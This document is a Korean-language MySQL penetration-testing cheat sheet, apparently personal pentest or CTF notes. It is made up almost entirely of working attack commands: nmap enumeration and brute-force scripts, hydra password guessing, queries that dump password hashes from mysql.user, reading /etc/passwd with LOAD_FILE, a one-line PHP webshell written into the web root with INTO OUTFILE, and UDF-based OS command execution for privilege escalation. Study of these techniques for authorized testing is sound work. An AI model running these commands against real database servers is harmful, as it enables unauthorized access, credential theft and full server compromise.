# MySQL (3306)

MySQL / MariaDB. 웹 애플리케이션의 백엔드 데이터베이스로 가장 흔히 사용.

---

## 열거

```bash
nmap -sV -sC -p 3306 TARGET
nmap --script=mysql-info,mysql-enum -p 3306 TARGET
```

---

## 접속

```bash
# 원격 접속
mysql -h TARGET -u root -p
mysql -h TARGET -u root

# 특정 DB 접속
mysql -h TARGET -u user -p -D database_name
```

---

## 인증 공격

```bash
# root 빈 비밀번호 확인
mysql -h TARGET -u root --password=''

# Hydra
hydra -l root -P passwords.txt mysql://TARGET

# nmap
nmap --script=mysql-brute -p 3306 TARGET
nmap --script=mysql-empty-password -p 3306 TARGET
```

---

## 후속 공격

### 정보 수집

```sql
-- 버전
SELECT VERSION();

-- 현재 사용자
SELECT USER();
SELECT CURRENT_USER();

-- 권한 확인
SHOW GRANTS;
SHOW GRANTS FOR 'root'@'localhost';

-- 데이터베이스 목록
SHOW DATABASES;

-- 테이블 목록
USE database_name;
SHOW TABLES;

-- 모든 사용자 (MySQL 시스템 테이블)
SELECT user, host, authentication_string FROM mysql.user;
```

### 파일 읽기/쓰기

```sql
-- 파일 읽기 (FILE 권한 필요, secure_file_priv 설정 확인)
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts');

-- secure_file_priv 확인
SHOW VARIABLES LIKE 'secure_file_priv';
-- 빈 값 = 제한 없음, NULL = 불가, 경로 = 해당 경로만 가능

-- 파일 쓰기 (webshell)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';

-- DUMPFILE (binary 파일)
SELECT 0x... INTO DUMPFILE '/var/www/html/shell.php';
```

### UDF (User Defined Function) 권한 상승

```bash
# MySQL이 root로 실행 중일 때 UDF를 통해 OS 명령 실행
# 1. UDF library 위치 확인
SHOW VARIABLES LIKE 'plugin_dir';

# 2. UDF library upload (lib_mysqludf_sys.so)
# 3. 함수 등록
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so';

# 4. 명령 실행
SELECT sys_eval('whoami');
SELECT sys_exec('id');
```

---

## MySQL 설정 파일 위치

```text
Linux:  /etc/mysql/my.cnf, /etc/my.cnf, ~/.my.cnf
Windows: C:\ProgramData\MySQL\MySQL Server X.X\my.ini
```

---

## Nmap NSE

```bash
nmap --script=mysql-databases --script-args mysqluser=root,mysqlpass=pass -p 3306 TARGET
nmap --script=mysql-audit --script-args mysql-audit.username=root,mysql-audit.password=pass -p 3306 TARGET
nmap --script=mysql-vuln-cve2012-2122 -p 3306 TARGET
```
